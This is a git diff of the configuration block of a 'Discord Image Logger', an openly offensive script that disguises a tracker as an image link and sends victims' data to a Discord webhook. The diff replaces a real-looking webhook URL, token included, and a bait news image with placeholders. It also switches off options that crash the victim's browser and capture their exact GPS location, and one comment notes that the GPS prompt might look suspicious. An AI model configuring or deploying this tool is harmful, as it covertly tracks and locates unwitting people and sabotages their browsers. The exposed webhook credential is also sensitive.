@@ -1,4 +1,3 @@
-
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
@@ -13,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1406553040365817987/6myIu_lwUtWklM04Tvf65kucR5wEK_ZDLpVNVxZ79YcfkrfGQHDxZaYZltNOt-OzLiYT",
-    "image": "https://ichef.bbci.co.uk/news/976/cpsprodpb/3DAE/production/_126009751_shyja.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -23,9 +22,9 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
